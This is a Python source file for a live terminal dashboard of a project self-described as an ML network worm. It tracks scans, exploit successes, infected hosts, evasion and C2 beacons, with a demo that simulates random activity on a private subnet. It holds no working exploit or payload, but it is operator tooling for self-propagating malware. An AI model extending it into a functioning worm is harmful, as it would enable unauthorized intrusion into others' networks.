"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Real-Time CLI Activity Monitor
Live terminal dashboard showing all worm activity
"""

import logging
import os
import sys

if sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8")
import threading
import time
from collections import deque
from datetime import datetime
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rich import box
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

# ── Silence Flask / Werkzeug / HTTP server access logs ───────────────────────
# These are the lines like: 127.0.0.1 - - [03/May/2026 08:02:26] "GET /api/map HTTP/1.1" 200 -
# They break Rich's Live display by printing directly to stdout
logging.getLogger("werkzeug").setLevel(logging.ERROR)
logging.getLogger("flask").setLevel(logging.ERROR)
logging.getLogger("http.server").setLevel(logging.ERROR)


class CLIMonitor:
    """
    Real-time CLI activity monitor for worm operations
    Shows live activity feed, statistics, and network topology
    """

    def __init__(self, max_events: int = 50, max_devices: int = 30):
        self.events = deque(maxlen=max_events)
        self.devices = {}
        self.stats = {
            "start_time": datetime.now(),
            "scans": 0,
            "exploits_attempted": 0,
            "exploits_success": 0,
            "exploits_failed": 0,
            "infections": 0,
            "evasions": 0,
            "ml_decisions": 0,
            "c2_beacons": 0,
            "errors": 0,
        }
        self.running = False
        self._lock = threading.Lock()
        self._activity_event = threading.Event()
        self.console = Console()

    def log_event(self, event_type: str, message: str, target: str = None, data: Dict = None):
        with self._lock:
            event = {
                "time": datetime.now().strftime("%H:%M:%S"),
                "type": event_type,
                "message": message,
                "target": target,
                "data": data or {},
            }
            self.events.append(event)

            if target and target not in self.devices:
                self.devices[target] = {
                    "ip": target,
                    "status": "discovered",
                    "events": 0,
                    "ports": [],
                    "os": "Unknown",
                    "last_seen": event["time"],
                }
            elif target:
                self.devices[target]["last_seen"] = event["time"]
                self.devices[target]["events"] += 1

            if event_type == "scan":
                self.stats["scans"] += 1
                if target:
                    self.devices[target]["status"] = "scanning"
            elif event_type == "exploit_success":
                self.stats["exploits_success"] += 1
                self.stats["exploits_attempted"] += 1
                if target:
                    self.devices[target]["status"] = "infected"
            elif event_type == "exploit_failed":
                self.stats["exploits_failed"] += 1
                self.stats["exploits_attempted"] += 1
                if target:
                    self.devices[target]["status"] = "failed"
            elif event_type == "infection":
                self.stats["infections"] += 1
                if target:
                    self.devices[target]["status"] = "infected"
            elif event_type == "evasion":
                self.stats["evasions"] += 1
            elif event_type == "ml_decision":
                self.stats["ml_decisions"] += 1
            elif event_type == "c2":
                self.stats["c2_beacons"] += 1
            elif event_type == "error":
                self.stats["errors"] += 1

            self._activity_event.set()

    def _get_type_color(self, event_type: str) -> str:
        colors = {
            "scan": "cyan",
            "exploit_success": "green",
            "exploit_failed": "yellow",
            "infection": "bold green",
            "evasion": "magenta",
            "ml_decision": "blue",
            "c2": "white",
            "error": "red",
            "info": "white",
            "warning": "yellow",
        }
        return colors.get(event_type, "white")

    def _get_type_icon(self, event_type: str) -> str:
        icons = {
            "scan": "🔍",
            "exploit_success": "✅",
            "exploit_failed": "❌",
            "infection": "🐛",
            "evasion": "🛡️",
            "ml_decision": "🧠",
            "c2": "📡",
            "error": "⚠️",
            "info": "ℹ️",
            "warning": "⚠️",
        }
        return icons.get(event_type, "•")

    def _get_status_badge(self, status: str) -> str:
        badges = {
            "discovered": "[cyan]DISCOVERED[/cyan]",
            "scanning": "[yellow]SCANNING[/yellow]",
            "infected": "[bold green]INFECTED[/bold green]",
            "failed": "[red]FAILED[/red]",
            "exploiting": "[magenta]EXPLOITING[/magenta]",
        }
        return badges.get(status, status)

    def _format_uptime(self) -> str:
        elapsed = (datetime.now() - self.stats["start_time"]).total_seconds()
        h = int(elapsed // 3600)
        m = int((elapsed % 3600) // 60)
        s = int(elapsed % 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _build_renderable(self):
        """Build and return the full dashboard as a Rich renderable (NOT printed)."""
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="stats", size=6),
            Layout(name="bottom", ratio=1),
            Layout(name="footer", size=1),
        )
        layout["bottom"].split_row(
            Layout(name="devices", ratio=6),
            Layout(name="activity", ratio=4),
        )

        # ── Header ────────────────────────────────────────────────────────────
        uptime = self._format_uptime()
        layout["header"].update(
            Panel(
                Text(
                    f"WORMY - ML Network Worm | Uptime: {uptime}",
                    justify="center",
                    style="bold cyan",
                ),
                box=box.DOUBLE,
                style="cyan",
            )
        )

        # ── Stats ─────────────────────────────────────────────────────────────
        total_attempts = self.stats["exploits_attempted"]
        success_rate = (
            (self.stats["exploits_success"] / total_attempts * 100) if total_attempts > 0 else 0
        )
        infected = sum(1 for d in self.devices.values() if d["status"] == "infected")

        stats_table = Table(box=box.SIMPLE, show_header=False, expand=True)
        for _ in range(8):
            stats_table.add_column()
        stats_table.add_row(
            "Scans:",
            str(self.stats["scans"]),
            "Scan Prog:",
            f"[yellow]{self.stats.get('scan_progress', 'Idle')}[/yellow]",
            "Infected:",
            str(infected),
            "Failed:",
            str(self.stats["exploits_failed"]),
        )
        stats_table.add_row(
            "[blue]ML Decisions:[/blue]",
            str(self.stats["ml_decisions"]),
            "[white]C2 Beacons:[/white]",
            str(self.stats["c2_beacons"]),
            "[red]Errors:[/red]",
            str(self.stats["errors"]),
            "[bold green]Success Rate:[/bold green]",
            f"{success_rate:.0f}%",
        )
        layout["stats"].update(
            Panel(stats_table, title="[bold white]STATISTICS[/bold white]", border_style="blue")
        )

        # ── Devices Table ─────────────────────────────────────────────────────
        dev_table = Table(box=box.ROUNDED, expand=True, style="blue")
        dev_table.add_column("IP Address", style="cyan")
        dev_table.add_column("Status")
        dev_table.add_column("OS", style="white")
        dev_table.add_column("Ports", style="yellow")
        dev_table.add_column("Events", justify="right")

        for ip, device in sorted(
            self.devices.items(), key=lambda x: x[1]["last_seen"], reverse=True
        )[:15]:
            ports = device.get("ports", [])
            ports_str = ",".join(str(p) for p in ports[:5])
            if len(ports) > 5:
                ports_str += "+"
            dev_table.add_row(
                ip,
                self._get_status_badge(device["status"]),
                device.get("os", "Unknown"),
                ports_str,
                str(device["events"]),
            )
        layout["devices"].update(
            Panel(
                dev_table,
                title=f"[bold white]DEVICES ({len(self.devices)})[/bold white]",
                border_style="cyan",
            )
        )

        # ── Activity Feed ─────────────────────────────────────────────────────
        activity_table = Table(box=None, show_header=False, expand=True)
        activity_table.add_column("Time", style="dim white", no_wrap=True)
        activity_table.add_column("Icon", no_wrap=True)
        activity_table.add_column("Message")

        for event in list(self.events)[-20:]:
            color = self._get_type_color(event["type"])
            icon = self._get_type_icon(event["type"])
            target = f" [cyan]{event['target']}[/cyan]" if event.get("target") else ""
            activity_table.add_row(
                event["time"],
                f"[{color}]{icon}[/{color}]",
                f"[{color}]{event['message']}[/{color}]{target}",
            )
        layout["activity"].update(
            Panel(
                activity_table,
                title="[bold white]ACTIVITY FEED[/bold white]",
                border_style="magenta",
            )
        )

        # ── Footer ────────────────────────────────────────────────────────────
        layout["footer"].update(
            Text("Press Ctrl+C to stop | Auto-refreshing every 2s", justify="center", style="dim")
        )

        return layout

    def render(self):
        """Legacy one-shot render (kept for backward compatibility)."""
        self.console.clear()
        self.console.print(self._build_renderable())

    def start_live_monitor(self, refresh_interval: float = 2.0):
        """
        Run the dashboard using Rich's Live context manager.
        This is the CORRECT way: Rich manages in-place redraw entirely,
        no manual clear() calls, no terminal multiplication.
        """
        self.running = True
        console = Console()
        try:
            with Live(
                self._build_renderable(),
                console=console,
                refresh_per_second=1 / refresh_interval,
                screen=True,  # full-screen mode — hides all other stdout
            ) as live:
                while self.running:
                    self._activity_event.wait(timeout=refresh_interval)
                    self._activity_event.clear()
                    live.update(self._build_renderable())
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            console.print("[bold yellow]Monitor stopped.[/bold yellow]")

    def start_background(self, refresh_interval: float = 2.0):
        self.running = True
        thread = threading.Thread(
            target=self.start_live_monitor, args=(refresh_interval,), daemon=True
        )
        thread.start()
        return thread

    def stop(self):
        self.running = False


class WormActivityBridge:
    def __init__(self, monitor: CLIMonitor):
        self.monitor = monitor

    def on_scan_start(self, target_ranges: List[str]):
        self.monitor.log_event("scan", f'Starting scan on { ", ".join(target_ranges) }')

    def on_host_discovered(self, ip: str, ports: List[int], os_guess: str = "Unknown"):
        self.monitor.log_event("scan", "Host discovered", ip, {"ports": ports, "os": os_guess})
        with self.monitor._lock:
            if ip in self.monitor.devices:
                self.monitor.devices[ip]["ports"] = ports
                self.monitor.devices[ip]["os"] = os_guess
                self.monitor.devices[ip]["status"] = "discovered"

    def on_exploit_attempt(self, ip: str, exploit_name: str):
        self.monitor.log_event("info", f"Attempting {exploit_name}", ip)

    def on_exploit_success(self, ip: str, exploit_name: str):
        self.monitor.log_event("exploit_success", f"{exploit_name} succeeded", ip)

    def on_exploit_failed(self, ip: str, exploit_name: str):
        self.monitor.log_event("exploit_failed", f"{exploit_name} failed", ip)

    def on_infection(self, ip: str, method: str):
        self.monitor.log_event("infection", f"Infected via {method}", ip)

    def on_ml_decision(self, target_ip: str, confidence: float):
        self.monitor.log_event(
            "ml_decision", f"Target selected (conf: {confidence:.2f})", target_ip
        )

    def on_evasion(self, technique: str):
        self.monitor.log_event("evasion", f"Evasion: {technique}")

    def on_error(self, message: str, target: str = None):
        self.monitor.log_event("error", message, target)


if __name__ == "__main__":
    import random

    monitor = CLIMonitor()

    def simulate_worm_activity():
        time.sleep(1)
        monitor.log_event("info", "Wormy ML Network Worm initialized")
        time.sleep(1)
        monitor.log_event("scan", "Starting network scan on 192.168.1.0/24")
        time.sleep(1)

        for i in range(100, 115):
            ip = f"192.168.1.{i}"
            ports = random.sample([22, 80, 443, 445, 3389, 3306, 5432, 8080], random.randint(1, 4))
            os_guess = random.choice(
                ["Windows 10", "Ubuntu 22.04", "CentOS 7", "Windows Server 2019"]
            )

            monitor.log_event("scan", "Host discovered", ip, {"ports": ports, "os": os_guess})
            with monitor._lock:
                if ip in monitor.devices:
                    monitor.devices[ip]["ports"] = ports
                    monitor.devices[ip]["os"] = os_guess
            time.sleep(0.5)

        time.sleep(1)
        exploits = ["SSH_Exploit", "SMB_Exploit", "Web_Exploit", "MySQL_Exploit", "RDP_Exploit"]

        for _ in range(20):
            ip = f"192.168.1.{random.randint(100, 114)}"
            exploit = random.choice(exploits)

            monitor.log_event(
                "ml_decision", f"Target selected (conf: {random.uniform(0.3, 0.95):.2f})", ip
            )
            time.sleep(0.5)

            monitor.log_event("info", f"Attempting {exploit}", ip)
            time.sleep(1)

            if random.random() > 0.4:
                monitor.log_event("exploit_success", f"{exploit} succeeded", ip)
                time.sleep(0.5)
                monitor.log_event("infection", f"Infected via {exploit}", ip)
            else:
                monitor.log_event("exploit_failed", f"{exploit} failed", ip)

            time.sleep(random.uniform(0.5, 2))

        monitor.log_event("evasion", "IDS detection active")
        time.sleep(1)
        monitor.log_event("c2", "Beacon sent to C2 server")
        time.sleep(1)
        monitor.log_event("info", "Propagation cycle complete")

    thread = threading.Thread(target=simulate_worm_activity, daemon=True)
    thread.start()

    monitor.start_live_monitor(refresh_interval=1.0)
